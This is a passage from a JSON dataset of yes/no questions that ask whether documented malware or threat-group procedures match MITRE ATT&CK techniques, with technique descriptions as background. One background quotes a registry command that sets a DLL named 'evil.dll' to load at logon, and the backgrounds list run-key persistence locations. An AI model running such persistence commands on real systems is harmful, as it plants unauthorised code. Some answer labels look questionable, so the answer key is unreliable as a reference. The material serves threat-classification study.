      "background": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "question": "Is procedure MoleNet can achieve persitence on the infected machine by setting the Registry run key. a type of technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Process Injection: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel..\nAnswer in Yes or No.\n\nQuestion: Is procedure Wizard Spider has used process injection to execute payloads to escalate privileges. a type of technique Obfuscated Files or Information: Indicator Removal from Tools",
    "context": "",
    "output": "No.\nThe provided context is related to Process Injection",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Process Injection: Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
      "question": "Is procedure Wizard Spider has used process injection to execute payloads to escalate privileges. a type of technique Obfuscated Files or Information: Indicator Removal from Tools",
      "yes/no": "No.\nThe provided context is related to Process Injection",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure SUNBURST had commands to enumerate files and directories. a type of technique File and Directory Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "File and Directory Discovery: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "question": "Is procedure SUNBURST had commands to enumerate files and directories. a type of technique File and Directory Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Internal Spearphishing: After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating Impersonation.\n\nFor example, adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic login interfaces.\n\nAdversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials..\nAnswer in Yes or No.\n\nQuestion: Is procedure Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization. a type of technique Obfuscated Files or Information: Indicator Removal from Tools",
    "context": "",
    "output": "No.\nThe provided context is correlated with Internal Spearphishing",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Internal Spearphishing: After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporating Impersonation.\n\nFor example, adversaries may leverage Spearphishing Attachment or Spearphishing Link as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through Input Capture on sites that mimic login interfaces.\n\nAdversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.",
      "question": "Is procedure Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization. a type of technique Obfuscated Files or Information: Indicator Removal from Tools",
      "yes/no": "No.\nThe provided context is correlated with Internal Spearphishing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Service Discovery: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions..\nAnswer in Yes or No.\n\nQuestion: Is procedure Tasklist can be used to discover services running on a system. a type of technique System Service Discovery",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Service Discovery: Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>.\n\nAdversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
      "question": "Is procedure Tasklist can be used to discover services running on a system. a type of technique System Service Discovery",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Emotet has used cmd.exe to run a PowerShell script.  related to technique Command and Scripting Interpreter: Windows Command Shell",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure Emotet has used cmd.exe to run a PowerShell script.  related to technique Command and Scripting Interpreter: Windows Command Shell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure PowerSploit's <code>Install-SSP</code> Persistence module can be used to establish by installing a SSP DLL. a type of technique Brute Force: Password Guessing",
    "context": "",
    "output": "No.\nThe provided context is correlated with Boot or Logon Autostart Execution: Security Support Provider",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Boot or Logon Autostart Execution: Security Support Provider: Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",
      "question": "Is procedure PowerSploit's <code>Install-SSP</code> Persistence module can be used to establish by installing a SSP DLL. a type of technique Brute Force: Password Guessing",
      "yes/no": "No.\nThe provided context is correlated with Boot or Logon Autostart Execution: Security Support Provider",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure During Operation Dream Job, Lazarus Group digitally signed their malware and the dbxcli utility.  related to technique Proxy: Internal Proxy.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Develop Capabilities: Code Signing Certificates",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Develop Capabilities: Code Signing Certificates: Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to Code Signing, adversaries may develop self-signed code signing certificates for use in operations.",
      "question": "Is procedure During Operation Dream Job, Lazarus Group digitally signed their malware and the dbxcli utility.  related to technique Proxy: Internal Proxy",
      "yes/no": "No.\nThe provided context is related to Develop Capabilities: Code Signing Certificates",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure ELMER uses HTTP for command and control. a type of technique Valid Accounts: Domain Accounts",
    "context": "",
    "output": "No.\nThe correct answer is Application Layer Protocol: Web Protocols",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "question": "Is procedure ELMER uses HTTP for command and control. a type of technique Valid Accounts: Domain Accounts",
      "yes/no": "No.\nThe correct answer is Application Layer Protocol: Web Protocols",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Clipboard Data: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents..\nAnswer in Yes or No.\n\nQuestion: Is procedure Agent Tesla can steal data from the victim\u2019s clipboard. a type of technique Clipboard Data",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Clipboard Data: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.",
      "question": "Is procedure Agent Tesla can steal data from the victim\u2019s clipboard. a type of technique Clipboard Data",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic..\nQ: Is procedure NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request. NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.  related to technique Shared Modules.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Application Layer Protocol: Web Protocols: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "question": "Is procedure NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request. NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.  related to technique Shared Modules",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Browser Session Hijacking: Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication..\nAnswer in Yes or No.\n\nQuestion: Is procedure Melcoz can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background. a type of technique Browser Session Hijacking",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Browser Session Hijacking: Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.",
      "question": "Is procedure Melcoz can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background. a type of technique Browser Session Hijacking",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS..\nAnswer in Yes or No.\n\nQuestion: Is procedure StrifeWater can self delete to cover its tracks.  related to technique Indicator Removal: File Deletion",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "question": "Is procedure StrifeWater can self delete to cover its tracks.  related to technique Indicator Removal: File Deletion",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Machete has the capability to exfiltrate stolen data to a hidden folder on a removable drive.  related to technique Modify Registry",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Hide Artifacts: Hidden Files and Directories: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
      "question": "Is procedure Machete has the capability to exfiltrate stolen data to a hidden folder on a removable drive.  related to technique Modify Registry",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Command and Scripting Interpreter: PowerShell: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)..\nAnswer in Yes or No.\n\nQuestion: Is procedure Ursnif droppers have used PowerShell in download cradles to download and execute the malware's full executable payload. a type of technique Command and Scripting Interpreter: PowerShell",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: PowerShell: Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).",
      "question": "Is procedure Ursnif droppers have used PowerShell in download cradles to download and execute the malware's full executable payload. a type of technique Command and Scripting Interpreter: PowerShell",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS..\nQ: Is procedure BackConfig has the ability to remove files and folders related to previous infections. a type of technique Windows Management Instrumentation.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Indicator Removal: File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "question": "Is procedure BackConfig has the ability to remove files and folders related to previous infections. a type of technique Windows Management Instrumentation",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Automated Collection: Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments..\nAnswer in Yes or No.\n\nQuestion: Is procedure GoldFinder logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node. a type of technique Automated Collection",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Automated Collection: Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \n\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \n\nThis functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
      "question": "Is procedure GoldFinder logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node. a type of technique Automated Collection",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Mispadu checks and will terminate execution if the compromised system\u2019s language ID is not Spanish or Portuguese. a type of technique Virtualization/Sandbox Evasion: System Checks",
    "context": "",
    "output": "No.\nThe provided context is related to System Location Discovery: System Language Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Location Discovery: System Language Discovery: Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.",
